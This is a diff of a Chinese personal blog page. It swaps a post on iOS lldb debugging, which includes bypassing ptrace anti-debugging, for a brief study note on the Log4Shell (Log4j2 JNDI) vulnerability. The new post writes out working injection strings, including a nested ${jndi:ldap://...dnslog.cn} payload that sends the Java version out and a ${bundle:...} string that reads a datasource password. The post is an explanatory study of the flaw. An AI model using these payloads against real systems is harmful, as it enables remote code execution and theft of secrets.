@@ -21,34 +21,27 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="越狱手机ps -ef | grep 进程 获得路径 &#x2F;var&#x2F;…… debugserver -x backboard 0.0.0.0:1234  &#x2F;var&#x2F;…… maclldb进入">
+<meta name="description" content="对java安全也不是很熟，平时也只是看一下攻击的姿势。但这次毕竟安全圈大事，凑个热闹 简单学习下原理。国外将其命名为 Log4Shell 前置结构：从上往下看 每一层  Java AppJndi ApiNaming MangerJndi apiLadp Dns  Rmi Corba 发展历程 2013年就存在的漏洞1.2013年，有人向Log4j2开源社区提交支持JNDI Lookup 插件的请求">
 <meta property="og:type" content="article">
-<meta property="og:title" content="IOS—lldb基础调试">
-<meta property="og:url" content="http://example.com/2021/10/03/IOS-lldb%E5%9F%BA%E7%A1%80%E8%B0%83%E8%AF%95/index.html">
+<meta property="og:title" content="Log4j2 相关总结(待修改，补充)">
+<meta property="og:url" content="http://example.com/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Kid">
-<meta property="og:description" content="越狱手机ps -ef | grep 进程 获得路径 &#x2F;var&#x2F;…… debugserver -x backboard 0.0.0.0:1234  &#x2F;var&#x2F;…… maclldb进入">
+<meta property="og:description" content="对java安全也不是很熟，平时也只是看一下攻击的姿势。但这次毕竟安全圈大事，凑个热闹 简单学习下原理。国外将其命名为 Log4Shell 前置结构：从上往下看 每一层  Java AppJndi ApiNaming MangerJndi apiLadp Dns  Rmi Corba 发展历程 2013年就存在的漏洞1.2013年，有人向Log4j2开源社区提交支持JNDI Lookup 插件的请求">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/ios-lldb/1.png">
-<meta property="og:image" content="http://example.com/images/ios-lldb/2.png">
-<meta property="og:image" content="http://example.com/images/ios-lldb/3.png">
-<meta property="og:image" content="http://example.com/images/ios-lldb/4.png">
-<meta property="og:image" content="http://example.com/images/ios-lldb/5.png">
-<meta property="og:image" content="http://example.com/images/ios-lldb/6.png">
-<meta property="article:published_time" content="2021-10-02T18:03:00.000Z">
-<meta property="article:modified_time" content="2021-11-02T13:22:28.445Z">
+<meta property="article:published_time" content="2022-01-01T09:33:00.000Z">
+<meta property="article:modified_time" content="2022-01-02T18:14:08.766Z">
 <meta property="article:author" content="Kid">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/ios-lldb/1.png">
 
 
-<link rel="canonical" href="http://example.com/2021/10/03/IOS-lldb%E5%9F%BA%E7%A1%80%E8%B0%83%E8%AF%95/">
+<link rel="canonical" href="http://example.com/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/10/03/IOS-lldb%E5%9F%BA%E7%A1%80%E8%B0%83%E8%AF%95/","path":"2021/10/03/IOS-lldb基础调试/","title":"IOS—lldb基础调试"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/","path":"2022/01/01/Log4j2相关总结/","title":"Log4j2 相关总结(待修改，补充)"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>IOS—lldb基础调试 | Kid</title>
+<title>Log4j2 相关总结(待修改，补充) | Kid</title>
   
 
   <script src="/js/third-party/analytics/baidu-analytics.js"></script>
@@ -129,7 +122,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B6%8A%E7%8B%B1%E6%89%8B%E6%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">越狱手机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mac"><span class="nav-number">2.</span> <span class="nav-text">mac</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9C%B0%E5%9D%80"><span class="nav-number">3.</span> <span class="nav-text">获取地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">4.</span> <span class="nav-text">获取基地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%9C%B0%E5%9D%80"><span class="nav-number">5.</span> <span class="nav-text">获取当前地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%84%E5%AD%98%E5%99%A8%E6%95%B0%E5%80%BC"><span class="nav-number">6.</span> <span class="nav-text">获取寄存器数值</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">前置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">结构：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E5%B1%95%E5%8E%86%E7%A8%8B-2013%E5%B9%B4%E5%B0%B1%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">发展历程 2013年就存在的漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E6%A0%B8%E5%BF%83"><span class="nav-number">2.</span> <span class="nav-text">问题核心</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Lookup"><span class="nav-number">2.1.</span> <span class="nav-text">Lookup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jndi-%E7%9A%84%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E5%88%87%E6%8D%A2%EF%BC%88%E6%AD%A3%E5%B8%B8%E5%8A%9F%E8%83%BD%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">Jndi 的动态协议切换（正常功能）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%8E%9F%E7%90%86"><span class="nav-number">2.3.</span> <span class="nav-text">简单原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF"><span class="nav-number">2.4.</span> <span class="nav-text">其他姿势</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -191,7 +184,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/IOS-lldb%E5%9F%BA%E7%A1%80%E8%B0%83%E8%AF%95/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/head.png">
@@ -204,7 +197,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          IOS—lldb基础调试
+          Log4j2 相关总结(待修改，补充)
         </h1>
 
         <div class="post-meta-container">
@@ -215,14 +208,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2021-10-02 18:03:00" itemprop="dateCreated datePublished" datetime="2021-10-02T18:03:00Z">2021-10-02</time>
+      <time title="创建时间：2022-01-01 09:33:00" itemprop="dateCreated datePublished" datetime="2022-01-01T09:33:00Z">2022-01-01</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-11-02 13:22:28" itemprop="dateModified" datetime="2021-11-02T13:22:28Z">2021-11-02</time>
+        <time title="修改时间：2022-01-02 18:14:08" itemprop="dateModified" datetime="2022-01-02T18:14:08Z">2022-01-02</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -230,7 +223,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/IOS/" itemprop="url" rel="index"><span itemprop="name">IOS</span></a>
+          <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
         </span>
     </span>
 
@@ -244,23 +237,18 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="越狱手机"><a href="#越狱手机" class="headerlink" title="越狱手机"></a>越狱手机</h1><p>ps -ef | grep 进程</p>
-<p>获得路径 /var/……</p>
-<p>debugserver -x backboard 0.0.0.0:1234  /var/……</p>
-<h1 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h1><p>lldb<br>进入</p>
-<span id="more"></span>  
-<p>process connect connect：//IP：port<br>b ptrace<br>c<br>p $x0<br>打印应该是30</p>
-<p>register write $x0 10</p>
-<p>绕过反调试<br>防止程序退出</p>
-<h1 id="获取地址"><a href="#获取地址" class="headerlink" title="获取地址"></a>获取地址</h1><p>Class-dump 头文件</p>
-<p><img src="/images/ios-lldb/1.png" alt="class-dump"></p>
-<p>点开 选getsessionid 进行测试<br><img src="/images/ios-lldb/2.png"></p>
-<h1 id="获取基地址"><a href="#获取基地址" class="headerlink" title="获取基地址"></a>获取基地址</h1><p>ida 打开 解压后的ipa包中的可执行文件</p>
-<p><img src="/images/ios-lldb/3.png" alt="获取基地址"></p>
-<h1 id="获取当前地址"><a href="#获取当前地址" class="headerlink" title="获取当前地址"></a>获取当前地址</h1><p>lldb 里 输入 imge list -o -f “进程名”<br><img src="/images/ios-lldb/4.png" alt="获取当前地址"></p>
-<h1 id="获取寄存器数值"><a href="#获取寄存器数值" class="headerlink" title="获取寄存器数值"></a>获取寄存器数值</h1><p>在登录处设置断点<br>breakpoint s -a 0x000000000064c000+0000000100857320</p>
-<p><img src="/images/ios-lldb/5.png" alt="断点打印"></p>
-<p>打印寄存器<br>出数据<br><img src="/images/ios-lldb/6.png" alt="断点打印"></p>
+        <p>对java安全也不是很熟，平时也只是看一下攻击的姿势。<br>但这次毕竟安全圈大事，凑个热闹 简单学习下原理。<br>国外将其命名为 Log4Shell</p>
+<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="结构："><a href="#结构：" class="headerlink" title="结构："></a>结构：</h2><p>从上往下看 每一层 </p>
+<p>Java App<br>Jndi Api<br>Naming Manger<br>Jndi api<br>Ladp Dns  Rmi Corba</p>
+<h2 id="发展历程-2013年就存在的漏洞"><a href="#发展历程-2013年就存在的漏洞" class="headerlink" title="发展历程 2013年就存在的漏洞"></a>发展历程 2013年就存在的漏洞</h2><p>1.2013年，有人向Log4j2开源社区提交支持JNDI Lookup 插件的请求并被采纳</p>
+<p>2.2016年 首次黑客大会介绍Jndi<br><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p>
+<p>3.2021年爆发</p>
+<p>ps：个人觉得，其实这个洞应该早就被利用了，只是在某种利益的情况，被爆了出来。<br>    好多-1day 都掌握在某些人或团队手里</p>
+<h1 id="问题核心"><a href="#问题核心" class="headerlink" title="问题核心"></a>问题核心</h1><h2 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h2><h2 id="Jndi-的动态协议切换（正常功能）"><a href="#Jndi-的动态协议切换（正常功能）" class="headerlink" title="Jndi 的动态协议切换（正常功能）"></a>Jndi 的动态协议切换（正常功能）</h2><p> Log4j-core 自带的lookup有很多实例<br> log4j2是Java 日志开发框架 1.x 重写的。</p>
+<h2 id="简单原理"><a href="#简单原理" class="headerlink" title="简单原理"></a>简单原理</h2><p> 日志打印 遇到 ${ 分割执行<br> logger.error(“error_message:${jndi:ldap://xxx/class}”);<br> 变成<br> jndi:ldap://xxx/xxx  进入存在漏洞的 JndiLookup 实例,用 InitialContext.lookup去访问<br> 导致jndi代码执行</p>
+<h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2><p>   “ElasticSearch利用Java的SecurityManager安全机制来防御文件操作和Socket操作，所以无法正常连接远程服务器”<br>   p牛的研究。所以其实有些有RASP，SecurityManager是无法rce的。</p>
+<p>   本地信息泄漏，报错回显：<br>   System.getProperty() ，System.getenv()，ResourceBundleLookup</p>
+<p>   展开来说：<br>   1.嵌套标签<br>    ${jndi:ldap://${java:version}.u2xf5m.dnslog.cn}<br>   2.sys env<br>    参考：<a target="_blank" rel="noopener" href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a><br>   3.Bundle<br>    参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a><br>    ${bundle:application:spring.datasource.password}<br>    条件：springboot加入log4j2依赖</p>
 
     </div>
 
@@ -292,7 +280,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2021/10/03/IOS-lldb%E5%9F%BA%E7%A1%80%E8%B0%83%E8%AF%95/" title="IOS—lldb基础调试">http://example.com/2021/10/03/IOS-lldb基础调试/</a>
+      <a href="http://example.com/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" title="Log4j2 相关总结(待修改，补充)">http://example.com/2022/01/01/Log4j2相关总结/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -305,14 +293,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/09/24/Crazyradio%20PA---%E7%BD%97%E6%8A%80%20%E9%BC%A0%E6%A0%87%E5%8A%AB%E6%8C%81/" rel="prev" title="Crazyradio PA---罗技 鼠标劫持">
-                  <i class="fa fa-chevron-left"></i> Crazyradio PA---罗技 鼠标劫持
+                <a href="/2021/12/06/arm64-hello,world/" rel="prev" title="arm64汇编(1)">
+                  <i class="fa fa-chevron-left"></i> arm64汇编(1)
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/10/10/%E6%9F%90%E8%9C%82app%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" rel="next" title="某蜂app抓包分析">
-                  某蜂app抓包分析 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
